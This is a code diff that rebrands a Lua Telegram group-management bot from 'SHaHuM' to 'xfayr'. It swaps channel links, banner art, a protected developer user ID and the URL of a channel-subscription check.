-send(msg.chat_id_, msg.id_,"[- SHaHuM Source .](https://t.me/TeaMSHaHuM)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "TeaMSHaHuM")..")".."\n⤦: تم تنريله من "..text1[2].." هنا")   
+send(msg.chat_id_, msg.id_,"[- fayr Source .](https://t.me/xfayr)\n𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄\n⤦: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "xfayr")..")".."\n⤦: تم تنريله من "..text1[2].." هنا")   
 end
 else
 info = "⤦: المعرف غلط"
@@ -3709,7 +3709,7 @@ if result.sender_user_id_ == tonumber(932565396) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1850171326) then
+if result.sender_user_id_ == tonumber(789908866) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3774,7 +3774,7 @@ return false
 end
 function Function_xfayr(extra, result, success)
 if result.id_ then
-if result.id_ == tonumber(1850171326) then
+if result.id_ == tonumber(789908866) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3838,7 +3838,7 @@ if userid == tonumber(932565396) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
-if userid == tonumber(1850171326) then
+if userid == tonumber(789908866) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
 return false 
 end
@@ -3948,7 +3948,7 @@ if result.sender_user_id_ == tonumber(932565396) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس  \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1850171326) then
+if result.sender_user_id_ == tonumber(789908866) then
 send(msg.chat_id_, msg.id_, "⤦: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس  \n")
 return false 
 end
@@ -5162,10 +5162,10 @@ send(msg.chat_id_, msg.id_,"⤦: تم مسح جميع الاوامر التي ت
 end
 end
 if text == "ترتيب الاوامر" and Constructor(msg) then
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 database:set(bot_id.."xfayr:Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
@@ -5187,10 +5187,10 @@ database:sadd(bot_id.."xfayr:List:Cmd:Group:New"..msg.chat_id_,"تفع")
 send(msg.chat_id_, msg.id_,"⤦: تم ترتيب الاوامر بالشكل التالي ~\n- ايدي - ا .\n- مميز - م .\n- ادمن - اد .\n- مدير - مد . \n- منشى - من . \n- المنشئ الاساسي - اس  . \n- تعطيل الايدي بالصوره - تعط .\n- تفعيل الايدي بالصوره - تفع .")  
 end
 if text == "اضف امر" and Constructor(msg) then
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 database:set(bot_id.."xfayr:Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
@@ -6498,7 +6498,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_,"⤦:  حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "TeaMSHaHuM")
+local UserName = (b.username_ or "xfayr")
 send(msg.chat_id_, msg.id_,"⤦: منشئ المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
@@ -6518,7 +6518,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_,"⤦: حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "TeaMSHaHuM")
+local UserName = (b.username_ or "xfayr")
 send(msg.chat_id_, msg.id_,"⤦: تم ترقية منشئ المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
 database:sadd(bot_id.."creator"..msg.chat_id_,b.id_)
 end,nil)   
@@ -7073,10 +7073,10 @@ database:set(bot_id..'xfayr:Lock:ID:Bot:Photo'..msg.chat_id_,true)
 send(msg.chat_id_, msg.id_,'⤦: تم تعطيل الايدي بالصوره') 
 end
 if text == 'تعين الايدي' and Owner(msg) then
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 database:setex(bot_id.."xfayr:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
@@ -7723,10 +7723,10 @@ database:del(bot_id.."Tshak:Lock:Games"..msg.chat_id_)
 send(msg.chat_id_, msg.id_,"\n⤦: تم تعطيل الالعاب") 
 end
 if text == "تفعيل الالعاب" and Owner(msg) then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 database:set(bot_id.."Tshak:Lock:Games"..msg.chat_id_,true) 
@@ -8120,7 +8120,7 @@ if audios.Info == true then
 local Text ='⤦: تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '- SHaHuM Source .',url="t.me/TeaMSHaHuM"}},
+{{text = '- fayr Source .',url="t.me/xfayr"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -8451,10 +8451,10 @@ send(msg.chat_id_, msg.id_, "⤦: تم التحديث")
 end
 
 if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then  
-local url,res = https.request('http://shahum.ml/subscrib-source/SouRceSHaHuM/ashtrak.php?id='..msg.sender_user_id_)
+local url,res = https.request('http://shahum.ml/subscrib-source/xfayr/ashtrak.php?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.info ~= true then
-send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @TeaMSHaHuM ] ❳')
+send(msg.chat_id_,msg.id_,'- اشترك في قناة السورس أولا\n[❲ @xfayr ] ❳')
 return false
 end
 local Text =[[
@@ -8466,20 +8466,21 @@ keyboard = {}
 keyboard.inline_keyboard = {
 
 {
-{text = '❲ Source SHaHuM ❳', url = "https://t.me/TeaMSHaHuM"}
+{text = '❲ Source fayr ❳', url = "https://t.me/xfayr"}
 },
 {
-{text = '❲ Source info ❳', url = "https://t.me/iNFoSHaHuM"}
+{text = '❲ Source info ❳', url = "https://t.me/fayrx"}
 },
 {
-{text = '❲ Coder ❳', url = "https://t.me/imshahum"}
+{text = '❲ Coder ❳', url = "https://t.me/rr8_8"}
 },
 {
-{text = '❲ TwS ❳', url = "https://t.me/Uv0BoT"}
+{text = '❲ TwS ❳', url = "https://t.me/I59bot"}
 },
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/NNAON/448&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+return false 
 end
 if text == 'حاله الاشتراك' or text == 'حاله اشتراك البوت' then  
 Text = [[⤦: حاله اشتراك البوت ( عادي ) .]]
@@ -8517,7 +8518,7 @@ Text = [[
 ⤦:  م4 -› لعرض اوامر المنشئين
 ⤦:  م5 -› لعرض اوامر المطورين
 𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄
-[⤦: SHaHuM source .](t.me/TeaMSHaHuM)
+[⤦: fayr source .](t.me/xfayr)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -8564,7 +8565,7 @@ Text = [[
 ⤦: الكلايش
 ⤦: السيلفي
 𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄
-[⤦: SHaHuM source .](t.me/TeaMSHaHuM)
+[⤦: fayr source .](t.me/xfayr)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -8636,7 +8637,7 @@ Text = [[
 ⤦: مسح الصلاحيات
 ⤦: مسح الرابط
 𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄
-[⤦: SHaHuM source .](t.me/TeaMSHaHuM)
+[⤦: fayr source .](t.me/xfayr)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -8683,7 +8684,7 @@ Text = [[
 ⤦: تفعيل/تعطيل اوامر التحشيش
 ⤦: تفعيل/تعطيل الرابط/جلب الرابط
 𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄
-[⤦: SHaHuM source .](t.me/TeaMSHaHuM)
+[⤦: fayr source .](t.me/xfayr)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -8719,7 +8720,7 @@ Text = [[
 ⤦: اضف رسائل + العدد بالرد
 ⤦: اضف مجوهرات + العدد بالرد
 𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄
-[⤦: SHaHuM source .](t.me/TeaMSHaHuM)
+[⤦: fayr source .](t.me/xfayr)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -8769,7 +8770,7 @@ Text = [[
 ⤦: رفع/تنزيل منشئ اساسي
 ⤦: مسح المنشئين الاساسين
 𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄𓐄
-[⤦: SHaHuM source .](t.me/TeaMSHaHuM)
+[⤦: fayr source .](t.me/xfayr)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -9300,7 +9301,7 @@ local A = io.open("sudo.lua", 'w')
 A:write([[
 s = "BGBBB"
 
-q = "TeaMSHaHuM"
+q = "xfayr"
 
 token = "]]..token..[["
 
@@ -9615,7 +9616,7 @@ local idchci = "-100"..idch
 local animation = DAata:match("^animation(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
 local Text ="⤦: تم اللغاء منعها بنجاح"
 inline = {
-{{text = '⤦: SHaHuM Source .',url='http://t.me/TeaMSHaHuM'}},
+{{text = '⤦: fayr Source .',url='http://t.me/xfayr'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9626,7 +9627,7 @@ local idchci = database:get(bot_id.."xfayr:Filter:msg")
 local photo = DAata:match("^pito(.*)$")
 local Text ="⤦: تم اللغاء منعها بنجاح"
 inline = {
-{{text = '⤦: SHaHuM Source .',url='http://t.me/TeaMSHaHuM'}},
+{{text = '⤦: fayr Source .',url='http://t.me/xfayr'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9638,7 +9639,7 @@ local idchci = "-100"..idch
 local Sticker = DAata:match("^Sticker(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
 local Text ="⤦: تم اللغاء منعه بنجاح"
 inline = {
-{{text = '⤦: SHaHuM Source .',url='http://t.me/TeaMSHaHuM'}},
+{{text = '⤦: fayr Source .',url='http://t.me/xfayr'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9648,7 +9649,7 @@ if DAata and DAata:match("^delallSticker(.*)$") and Addictive(data) then
 local delallSticker = DAata:match("^delallSticker(.*)$")
 local Text ="⤦: تم اللغاء منع كل المتحركات"
 inline = {
-{{text = '⤦: SHaHuM Source .',url='http://t.me/TeaMSHaHuM'}},
+{{text = '⤦: fayr Source .',url='http://t.me/xfayr'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9661,7 +9662,7 @@ if DAata and DAata:match("^delallanimation(.*)$") and Addictive(data) then
 local delallmation = DAata:match("^delallanimation(.*)$")
 local Text ="⤦: تم اللغاء منع كل المتحركات"
 inline = {
-{{text = '⤦: SHaHuM Source .',url='http://t.me/TeaMSHaHuM'}},
+{{text = '⤦: fayr Source .',url='http://t.me/xfayr'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9674,7 +9675,7 @@ if DAata and DAata:match("^delallph(.*)$") and Addictive(data) then
 local delallph = DAata:match("^delallph(.*)$")
 local Text ="⤦: تم اللغاء منع كل الصور"
 inline = {
-{{text = '⤦: SHaHuM Source .',url='http://t.me/TeaMSHaHuM'}},
+{{text = '⤦: fayr Source .',url='http://t.me/xfayr'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -10000,17 +10001,17 @@ end
 if (data.ID == "UpdateOption" and data.value_.value_ == "Ready") then
 print("\27[34m"..[[
 >> The Bot is Running
->> Bot source > SHaHuM
->>Source channel > @TeaMSHaHuM
+>> Bot source > fayr
+>>Source channel > @xfayr
 >>Source CoDeR > @imSHaHuM
-   _____             _____           _____ _    _       _    _       __  __ 
-  / ____|           |  __ \         / ____| |  | |     | |  | |     |  \/  |
- | (___   ___  _   _| |__) |___ ___| (___ | |__| | __ _| |__| |_   _| \  / |
-  \___ \ / _ \| | | |  _  // __/ _ \\___ \|  __  |/ _` |  __  | | | | |\/| |
-  ____) | (_) | |_| | | \ \ (__  __/____) | |  | | (_| | |  | | |_| | |  | |
- |_____/ \___/ \__,_|_|  \_\___\___|_____/|_|  |_|\__,_|_|  |_|\__,_|_|  |_|
-                                                                            
-                                                                            
+  ______            _______         __  __ 
+ |  ____|          |__   __|       |  \/  |
+ | |__ __ _ _   _ _ __| | ___  __ _| \  / |
+ |  __/ _` | | | | '__| |/ _ \/ _` | |\/| |
+ | | | (_| | |_| | |  | |  __/ (_| | |  | |
+ |_|  \__,_|\__, |_|  |_|\___|\__,_|_|  |_|
+             __/ |                         
+            |___/                          
 ]].."\27[m")
 local list = database:smembers(bot_id..'xfayr:UsersBot')  
 for k,v in pairs(list) do 
